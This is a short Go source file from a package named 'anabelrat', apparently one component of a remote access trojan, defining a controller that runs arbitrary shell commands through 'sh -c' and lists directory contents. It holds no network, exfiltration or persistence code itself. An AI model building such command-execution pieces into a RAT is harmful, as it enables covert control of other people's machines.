package anabelrat
import (
	"os/exec"
	"strings"
	"os"
)
type AnabelController struct{}
func NewAnabelController() *AnabelController {
	return &AnabelController{}
}
func (a *AnabelController) ExecuteShell(cmd string) string {
	out, _ := exec.Command("sh", "-c", cmd).Output()
	return string(out)
}
func (a *AnabelController) ListFiles(path string) string {
	files, _ := os.ReadDir(path)
	var res strings.Builder
	for _, f := range files {
		res.WriteString(f.Name() + "\n")
	}
	return res.String()
}
